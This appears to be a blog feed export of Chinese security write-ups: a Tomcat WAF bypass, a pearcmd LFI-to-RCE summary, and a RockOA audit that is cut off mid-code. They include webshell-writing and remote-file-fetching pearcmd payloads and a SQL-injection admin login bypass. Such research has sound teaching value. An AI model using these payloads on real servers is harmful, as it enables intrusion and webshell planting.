src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/12.png"></p><p>接着我们继续后面会继续执行<code>decodeFilename</code></p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/13.png"></p><p>代码逻辑很清晰字符串的解码,如果字符串是否在<code>RFC 5987</code>文档规定的Header字符就直接调用baos.write写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">attr-char     = ALPHA / DIGIT</span><br><span class="line">                  / &quot;!&quot; / &quot;#&quot; / &quot;$&quot; / &quot;&amp;&quot; / &quot;+&quot; / &quot;-&quot; / &quot;.&quot;</span><br><span class="line">                  / &quot;^&quot; / &quot;_&quot; / &quot;`&quot; / &quot;|&quot; / &quot;~&quot;</span><br><span class="line">                  ; token except ( &quot;*&quot; / &quot;&#x27;&quot; / &quot;%&quot; )</span><br></pre></td></tr></table></figure><p>如果不在要求这一位必须是<code>%</code>然后16进制解码后两位，其实就是url解码，简单测试即可</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/20.png"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.ch1ng.com/blog/264.html">https://www.ch1ng.com/blog/264.html</a></p><p><a href="https://datatracker.ietf.org/doc/html/rfc6266#section-4.3">https://datatracker.ietf.org/doc/html/rfc6266#section-4.3</a></p><p><a href="https://datatracker.ietf.org/doc/html/rfc2231">https://datatracker.ietf.org/doc/html/rfc2231</a></p><p><a href="https://datatracker.ietf.org/doc/html/rfc5987#section-3.2.1">https://datatracker.ietf.org/doc/html/rfc5987#section-3.2.1</a></p><p><a href="https://y4tacker.github.io/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/">https://y4tacker.github.io/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/</a></p><p><a href="https://docs.oracle.com/javaee/7/api/javax/servlet/http/Part.html#getSubmittedFileName--">https://docs.oracle.com/javaee/7/api/javax/servlet/http/Part.html#getSubmittedFileName--</a></p><p><a href="http://t.zoukankan.com/summerday152-p-13969452.html#%E4%BA%8C%E3%80%81%E5%A4%84%E7%90%86%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6multipartfile%E6%8E%A5%E5%8F%A3">http://t.zoukankan.com/summerday152-p-13969452.html#%E4%BA%8C%E3%80%81%E5%A4%84%E7%90%86%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6multipartfile%E6%8E%A5%E5%8F%A3</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于pearcmd利用总结</title>
      <link href="/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="环境条件"><a href="#环境条件" class="headerlink" title="环境条件"></a>环境条件</h2><p>有两个条件</p><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p><p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code></p><p>并且php.ini当中 register_argc_argv=On需要开启</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>pear会在<code>pearcmd.php</code>获取命令行参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PEAR_Command::setFrontendType(<span class="string">&#x27;CLI&#x27;</span>);</span><br><span class="line"><span class="variable">$all_commands</span> = PEAR_Command::getCommands();</span><br><span class="line"></span><br><span class="line"><span class="variable">$argv</span> = Console_Getopt::readPHPArgv();</span><br><span class="line"><span class="comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span></span><br><span class="line"><span class="keyword">if</span> (php_sapi_name() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]) &amp;&amp; <span class="variable">$argv</span>[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$argv</span> = array_values(<span class="variable">$argv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而pear获取命令行参数在<code>readPHPArgv()</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static function readPHPArgv()</span><br><span class="line">    &#123;</span><br><span class="line">        global $argv;</span><br><span class="line">        if (!is_array($argv)) &#123;</span><br><span class="line">            if (!@is_array($_SERVER[&#x27;argv&#x27;])) &#123;</span><br><span class="line">                if (!@is_array($GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;])) &#123;</span><br><span class="line">                    $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;</span><br><span class="line">                    return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);</span><br><span class="line">                &#125;</span><br><span class="line">                return $GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;];</span><br><span class="line">            &#125;</span><br><span class="line">            return $_SERVER[&#x27;argv&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        return $argv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里会先尝试<code>$argv</code>，如果不存在再尝试<code>$_SERVER[&#39;argv&#39;]</code>，后者我们可通过query-string控制。也就是说，我们通过Web访问了pear命令行的功能，且能够控制命令行的参数</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>可以看到参数有这么多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Commands:</span><br><span class="line">build                  Build an Extension From C Source</span><br><span class="line">bundle                 Unpacks a Pecl Package</span><br><span class="line">channel-add            Add a Channel</span><br><span class="line">channel-alias          Specify an <span class="built_in">alias</span> to a channel name</span><br><span class="line">channel-delete         Remove a Channel From the List</span><br><span class="line">channel-discover       Initialize a Channel from its server</span><br><span class="line">channel-info           Retrieve Information on a Channel</span><br><span class="line">channel-login          Connects and authenticates to remote channel server</span><br><span class="line">channel-logout         Logs out from the remote channel server</span><br><span class="line">channel-update         Update an Existing Channel</span><br><span class="line">clear-cache            Clear Web Services Cache</span><br><span class="line">config-create          Create a Default configuration file</span><br><span class="line">config-get             Show One Setting</span><br><span class="line">config-help            Show Information About Setting</span><br><span class="line">config-set             Change Setting</span><br><span class="line">config-show            Show All Settings</span><br><span class="line">convert                Convert a package.xml 1.0 to package.xml 2.0 format</span><br><span class="line">cvsdiff                Run a <span class="string">&quot;cvs diff&quot;</span> <span class="keyword">for</span> all files <span class="keyword">in</span> a package</span><br><span class="line">cvstag                 Set CVS Release Tag</span><br><span class="line">download               Download Package</span><br><span class="line">download-all           Downloads each available package from the default channel</span><br><span class="line">info                   Display information about a package</span><br><span class="line">install                Install Package</span><br><span class="line">list                   List Installed Packages In The Default Channel</span><br><span class="line">list-all               List All Packages</span><br><span class="line">list-channels          List Available Channels</span><br><span class="line">list-files             List Files In Installed Package</span><br><span class="line">list-upgrades          List Available Upgrades</span><br><span class="line">login                  Connects and authenticates to remote server [Deprecated <span class="keyword">in</span> favor of channel-login]</span><br><span class="line"><span class="built_in">logout</span>                 Logs out from the remote server [Deprecated <span class="keyword">in</span> favor of channel-logout]</span><br><span class="line">makerpm                Builds an RPM spec file from a PEAR package</span><br><span class="line">package                Build Package</span><br><span class="line">package-dependencies   Show package dependencies</span><br><span class="line">package-validate       Validate Package Consistency</span><br><span class="line">pickle                 Build PECL Package</span><br><span class="line">remote-info            Information About Remote Packages</span><br><span class="line">remote-list            List Remote Packages</span><br><span class="line">run-scripts            Run Post-Install Scripts bundled with a package</span><br><span class="line">run-tests              Run Regression Tests</span><br><span class="line">search                 Search remote package database</span><br><span class="line">shell-test             Shell Script Test</span><br><span class="line">sign                   Sign a package distribution file</span><br><span class="line">svntag                 Set SVN Release Tag</span><br><span class="line">uninstall              Un-install Package</span><br><span class="line">update-channels        Update the Channel List</span><br><span class="line">upgrade                Upgrade Package</span><br><span class="line">upgrade-all            Upgrade All Packages [Deprecated <span class="keyword">in</span> favor of calling upgrade with no parameters]</span><br></pre></td></tr></table></figure><p>可以看见这里面有三个可能利用的参数，一个是p牛文中提到的config-create，一个install还有用过download</p><h3 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h3><p>多加一个die，防止多个输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=/www/server/php/52/lib/php/pearcmd.php&amp;+config-create+/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);die()?&gt;+/tmp/test.php </span><br></pre></td></tr></table></figure><h3 id="install"><a href="#install" class="headerlink" title="install"></a>install</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=/www/server/php/52/lib/php/peclcmd.php&amp;+install+http://vps/1.php</span><br></pre></td></tr></table></figure><p>文件就会被下载到<code>/tmp/pear/download/1.php</code>，回显能看到</p><p><img src="/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/1.png"></p><h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><p>个人觉得这个比上面install舒服点，这个直接下载到web目录了，不用提前知道web目录具体路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=/www/server/php/<span class="number">52</span>/lib/php/peclcmd.php&amp;+download+http:<span class="comment">//vps/1.php</span></span><br></pre></td></tr></table></figure><h2 id="闲话"><a href="#闲话" class="headerlink" title="闲话"></a>闲话</h2><p>如果pearcmd关键词被ban怎么半，其实可以用peclcmd.php作为平替，在这个php文件当中其实就是引入了pearcmd.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;/www/server/php/52/lib/php&#x27;</span> != <span class="string">&#x27;@&#x27;</span>.<span class="string">&#x27;include_path&#x27;</span>.<span class="string">&#x27;@&#x27;</span>) &#123;</span><br><span class="line">    ini_set(<span class="string">&#x27;include_path&#x27;</span>, <span class="string">&#x27;/www/server/php/52/lib/php&#x27;</span>);</span><br><span class="line">    <span class="variable">$raw</span> = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// this is a raw, uninstalled pear, either a cvs checkout, or php distro</span></span><br><span class="line">    <span class="variable">$raw</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">define(<span class="string">&#x27;PEAR_RUNTYPE&#x27;</span>, <span class="string">&#x27;pecl&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;pearcmd.php&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://tttang.com/archive/1312/">https://tttang.com/archive/1312/</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pearcmd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Y4教你审计系列之RockOA</title>
      <link href="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/"/>
      <url>/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Y4教你审计系列之RockOA"><a href="#Y4教你审计系列之RockOA" class="headerlink" title="Y4教你审计系列之RockOA"></a>Y4教你审计系列之RockOA</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>不知道是啥版本无语子，反正老师给的简单审一下，顺便吐槽一句老师连续两天只教用工具到处乱扫累</p><p>放了个备份在<a href="https://github.com/Y4tacker/CTFBackup/blob/main/oa/rockoa/rockoa.zip">https://github.com/Y4tacker/CTFBackup/blob/main/oa/rockoa/rockoa.zip</a></p><h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>不同于其他这个默认首页上rock.php，也是简单的自己去实现了MVC，我们先看看rock.php</p><p>可以看到，首先是定义了项目的PROJECT变量，接下来判断是否安装以及如果没有登陆则跳转到登陆页</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">define(<span class="string">&#x27;PROJECT&#x27;</span>, <span class="string">&#x27;webrock&#x27;</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;config/config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$islogin</span>= (<span class="keyword">int</span>)<span class="variable">$rock</span>-&gt;session(QOM.<span class="string">&#x27;adminid&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$m</span>= <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>= PROJECT;</span><br><span class="line"><span class="variable">$d</span>= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>= <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ajaxbool</span>= <span class="variable">$rock</span>-&gt;get(<span class="string">&#x27;ajaxbool&#x27;</span>,<span class="string">&#x27;false&#x27;</span>);</span><br><span class="line"><span class="variable">$mode</span>= <span class="variable">$rock</span>-&gt;get(<span class="string">&#x27;m&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$dir</span>= <span class="variable">$rock</span>-&gt;get(<span class="string">&#x27;d&#x27;</span>, <span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$config</span>[<span class="string">&#x27;install&#x27;</span>] &amp;&amp; <span class="variable">$mode</span> != <span class="string">&#x27;install&#x27;</span>)<span class="variable">$rock</span>-&gt;location(<span class="string">&#x27;?m=install&#x27;</span>);<span class="comment">//已可以正常登录，这句可删除</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$mode</span>==<span class="string">&#x27;login&#x27;</span> || <span class="variable">$dir</span>==<span class="string">&#x27;taskrun&#x27;</span> || <span class="variable">$mode</span>==<span class="string">&#x27;taskrun&#x27;</span> || <span class="variable">$mode</span>==<span class="string">&#x27;install&#x27;</span>)<span class="variable">$islogin</span> = <span class="number">1</span>;<span class="comment">//不可删除</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$islogin</span> == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ajaxbool</span> == <span class="string">&#x27;true&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sorry! not sign&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$rock</span>-&gt;location(<span class="string">&#x27;?m=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;include/View.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>接下来才是重点<code>include_once(&#39;include/View.php&#39;);</code>，这里看见有三个重要的参数，一个d决定项目路径也就是对应web根目录下的子目录名称，m对应模块名称其实就是下一级目录以及通过d决定了引入的类（目录与Action.php同名），以及a参数决定执行哪个方法，同样可以看到这里可以配合目录穿越引入其他的类，<code>可惜不能控制前缀</code>，不然低版本我们可以配合zip或者phar(php&gt;5.3.0),payload像下面这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip:<span class="comment">///var/www/html/info.zip%23info.php</span></span><br><span class="line">phar:<span class="comment">///var/www/html/info.zip/info.php</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/1.png"></p><p>接下来其实还有一个重要的参数ajaxbool也是get请求传入，如果为true则回去访问对应类方法当中的Ajax方法，如果不是则访问对应类方法的Action方法，并渲染tpl模板</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/2.png"></p><h2 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h2><p>由于是个OA，因此其实前台功能不多比如登陆、安装等基本上就无了不像我们的内容管理系统，这个更偏向于办公</p><h3 id="登陆页SQL注入"><a href="#登陆页SQL注入" class="headerlink" title="登陆页SQL注入"></a>登陆页SQL注入</h3><p>这里简单测试万能密码就行了，其他的盲注之类的原理差不多，可以看见这里直接对参数进行拼接因此有sql注入的风险，这里的逻辑是先在数据库当中查出一条数据，再拿出密码去比对</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/3.png"></p><p>简单测试万能密码，其他的注入脱裤啥的就不测了，没必要，主要是这里是盲注我懒得去写脚本</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/4.png"></p><p>但是这里有一个问题，我们看进入了后台以后发现不是admin，再回到代码我们可以看到这里其实是id控制的，因此我们将union 第二个参数修改为admin对应的id即可，这里默认安装的时候设置的为1</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/5.png"></p><p>因此简单修改payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adminuser=<span class="number">0</span><span class="string">&#x27; union select &#x27;</span>e10adc3949ba59abbe56e057f20f883e<span class="string">&#x27;,1,3,&#x27;</span>admin<span class="string">&#x27;,5%23&amp;adminpass=123456&amp;rempass=0&amp;button=1&amp;jmpass=false</span></span><br></pre></td></tr></table></figure><h3 id="前台RCE-文件读取"><a href="#前台RCE-文件读取" class="headerlink" title="前台RCE/文件读取"></a>前台RCE/文件读取</h3><p>这个版本很逗，有个逻辑漏洞导致可以重装再RCE，首先我们知道对于Ajax的请求也就是要求ajaxbool参数为true，而如果为true则必须要进行登陆，可能是因为这些请求都属于后台功能</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$islogin</span> == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ajaxbool</span> == <span class="string">&#x27;true&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sorry! not sign&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$rock</span>-&gt;location(<span class="string">&#x27;?m=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这里又很逗，咋说呢，来看看islogin是如何赋值的，因为这里是逻辑或所以只要满足任意条件就能登陆</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$mode</span>==<span class="string">&#x27;login&#x27;</span> || <span class="variable">$dir</span>==<span class="string">&#x27;taskrun&#x27;</span> || <span class="variable">$mode</span>==<span class="string">&#x27;taskrun&#x27;</span> || <span class="variable">$mode</span>==<span class="string">&#x27;install&#x27;</span>)<span class="variable">$islogin</span> = <span class="number">1</span>;<span class="comment">//不可删除</span></span><br></pre></td></tr></table></figure><p>因此我们完全可以控制m=install进入重装，最搞笑的是这里不像其他系统会首先判断是否已安装，这里就是可以随意重新安装无语子，而且最后他会把配置信息拼接写入一个php文件造成了前台的RCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">installClassAction</span> <span class="keyword">extends</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> function <span class="title">initMysql</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$<span class="keyword">this</span>-&gt;linkdb = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> function <span class="title">defaultAction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$<span class="keyword">this</span>-&gt;title= TITLE.<span class="string">&#x27;_安装&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> function <span class="title">saveAjax</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$host = $<span class="keyword">this</span>-&gt;post(<span class="string">&#x27;host&#x27;</span>);</span><br><span class="line">$user = $<span class="keyword">this</span>-&gt;post(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">$pass = $<span class="keyword">this</span>-&gt;post(<span class="string">&#x27;pass&#x27;</span>);</span><br><span class="line">$base = $<span class="keyword">this</span>-&gt;post(<span class="string">&#x27;base&#x27;</span>);</span><br><span class="line">$perfix = $<span class="keyword">this</span>-&gt;post(<span class="string">&#x27;perfix&#x27;</span>);</span><br><span class="line">$title = $<span class="keyword">this</span>-&gt;post(<span class="string">&#x27;title&#x27;</span>);</span><br><span class="line">$qom = $<span class="keyword">this</span>-&gt;post(<span class="string">&#x27;qom&#x27;</span>);</span><br><span class="line">$url = $<span class="keyword">this</span>-&gt;post(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line">$highpass = $<span class="keyword">this</span>-&gt;post(<span class="string">&#x27;highpass&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$msg  = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($<span class="keyword">this</span>-&gt;isempt($msg))&#123;</span><br><span class="line"><span class="meta">@$conn</span>=mysql_connect($host,$user,$pass);</span><br><span class="line">$msg = mysql_error();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$<span class="keyword">this</span>-&gt;isempt($msg))&#123;</span><br><span class="line">$msg = <span class="string">&#x27;无法连接数据库密码/用户名有误&#x27;</span>;</span><br><span class="line">&#125;</span><br><span 